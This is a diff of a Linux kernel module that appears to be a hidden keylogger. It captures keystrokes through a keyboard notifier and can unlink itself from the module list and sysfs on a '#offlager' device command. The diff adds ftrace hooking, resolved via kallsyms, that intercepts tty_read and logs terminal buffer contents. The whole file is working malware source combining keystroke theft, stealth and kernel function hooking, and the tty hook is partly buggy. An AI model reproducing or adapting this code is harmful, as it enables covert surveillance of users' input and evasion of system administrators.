@@ -11,6 +11,10 @@
 #include <linux/buffer_head.h>
 #include <linux/string.h>
 #include <linux/sysfs.h>
+#include <linux/ftrace.h>
+#include <linux/kallsyms.h>
+#include <linux/linkage.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -55,8 +59,8 @@ static const char *keymap[][2] = {
 int keylog(struct notifier_block *, unsigned long, void *);
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
-static ssize_t device_read(struct file *, char *, size_t, loff_t *);
-static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
+static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
+static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);
 
 static struct kobject *testhold;
 
@@ -82,6 +86,132 @@ static struct file_operations fops = {
 static struct notifier_block nb = {
 	.notifier_call = keylog
 };
+
+struct ftrace_hook {
+	const char *name;
+	void *function;
+	void *original;
+
+	unsigned long address;
+	struct ftrace_ops ops;
+};
+
+static int ftrace_resolve(struct ftrace_hook *hook) {
+	hook->address = kallsyms_lookup_name(hook->name);
+
+	if(!hook->address) {
+		pr_debug("unresolved symbol: %s\n", hook->name);
+		return -ENOENT;
+	}
+
+	return 0;
+}
+
+static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+		struct ftrace_ops *ops, struct pt_regs *regs) {
+
+	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops); 
+
+	if(!within_module(parent_ip, THIS_MODULE))
+		regs->ip = (unsigned long)hook->function;
+}
+
+int install_hook(struct ftrace_hook *hook) {
+	int err;
+
+	err = ftrace_resolve(hook);
+	if(err)
+		return err;
+
+	hook->ops.func = ftrace_thunk;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+		| FTRACE_OPS_FL_RECURSION_SAFE 
+		| FTRACE_OPS_FL_IPMODIFY;
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if(err) {
+		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+		return err;
+	}
+
+	err = register_ftrace_function(&hook->ops);
+	if (err) {
+		pr_debug("register_ftrace_function() failed: %d\n", err);
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return err;
+	}
+
+	return 0;
+}
+
+void remove_hook(struct ftrace_hook *hook) {
+	int err;
+
+	err = unregister_ftrace_function(&hook->ops);
+	if(err) {
+		pr_debug("unregister_ftrace_function() failed: %d\n", err);
+	}
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+	if(err) {
+		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+	}
+}
+
+int install_hooks(struct ftrace_hook *hooks, size_t count) {
+	int err;
+	size_t i;
+
+	for(i=0;i < count;i++) {
+		err = install_hook(&hooks[i]);
+		if(err)
+			goto error;
+	}
+
+	return 0;
+
+error:
+
+	while (i != 0) {
+		remove_hook(&hooks[--i]);
+	}
+
+	return err;
+}
+
+void remove_hooks(struct ftrace_hook *hooks, size_t count) {
+	size_t i;
+
+	for (i=0;i < count;i++)
+		remove_hook(&hooks[i]);
+}
+
+static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf, 
+		size_t count, loff_t *ppos);
+
+static asmlinkage ssize_t *ftrace_tty_read(struct file *file, char __user *buf,
+		size_t count, loff_t *ppos) {
+
+	ssize_t ret;
+	
+	pr_info("test data: %s\n", buf);
+	ret = real_tty_read(file, buf, count, ppos);
+
+	return ret;
+}
+
+
+#define HOOK(_name, _function, _original)  \
+	{									   \
+		.name = (_name),                   \
+		.function = (_function),           \
+		.original = (_original),           \
+	}
+
+static struct ftrace_hook tty_hooks[] = {
+	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
+};
+
 
 static struct list_head *mlist;
 
@@ -116,6 +246,8 @@ static int device_open(struct inode *inode, struct file *file) {
 	is_open++;
 	try_module_get(THIS_MODULE);
 
+	printk(KERN_INFO "device opened");
+
 	return SUCCESS;
 }
 
@@ -126,7 +258,7 @@ static int device_release(struct inode *inode, struct file *file) {
 	return 0;
 }
 
-static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * off) {
+static ssize_t device_read(struct file *filp, char __user *buff, size_t len, loff_t * off) {
 	int bytes_read = 0;
 
 	if(*msg_ptr == 0)
@@ -143,16 +275,18 @@ static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * o
 }
 
 static ssize_t
-device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
+device_write(struct file *filp, const char __user *buff, size_t len, loff_t *off) {
 	//printk("written: %d\n", 5);
 
 	//char *str;
 	//strcpy(str, buff);
 	//int length = strlen(str);
+	//printk(KERN_INFO "write reached");
+
 	char *str = kmalloc(len, GFP_KERNEL);
 	int error_count = copy_from_user(str, buff, len);
 	char *strings = "strangzz";
-	printk("writered: %s\n", str);
+	printk(KERN_INFO "writered: %c\n", str[0]);
 	
 	if(strncmp("#offlager", str, 9) == 0) {
 		if(hidden == 1)
@@ -168,6 +302,7 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 		THIS_MODULE->sect_attrs = NULL;
 		THIS_MODULE->notes_attrs = NULL;
 	} else if(strncmp("#onlager", str, 8) == 0) {
+		printk(KERN_INFO "log started?");
 		if(hidden == 0)
 			return -EINVAL;
 
@@ -175,6 +310,7 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 		kobject_put(&THIS_MODULE->mkobj.kobj);
 		list_add(&THIS_MODULE->list, mlist);
 
+		printk(KERN_INFO "kobject_put passed");
 		res = kobject_add(&THIS_MODULE->mkobj.kobj, 
 				THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
 		
@@ -207,11 +343,14 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 	return -EINVAL;
 }
 
+
+
 int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
     
-    if(code == KBD_KEYCODE) {
+    printk(KERN_INFO "Something");
+	if(code == KBD_KEYCODE) {
 		if(param->value==42 || param->value==54) {
 	    	down(&sem);
 
@@ -251,6 +390,7 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
 static int __init init_klog(void) {
 	keybuf[0] = '\0';
 	hidden = 0;
+	int err;
 
     register_keyboard_notifier(&nb);
     printk(KERN_INFO "Registering keylager\n");
@@ -260,13 +400,18 @@ static int __init init_klog(void) {
 	printk(KERN_INFO "major: %d\n", major);
 	printk(KERN_INFO "module name: %s\n", THIS_MODULE->name);
 
-    return 0;
+    err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
+	if(err)
+		return err;	
+	
+	return 0;
 }
 
 static void __exit cleanup_klog(void) {
     unregister_keyboard_notifier(&nb);
     unregister_chrdev(major, DEVICE_NAME);
 
+	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
     printk(KERN_INFO "Unregistered keylager\n");
 }
 
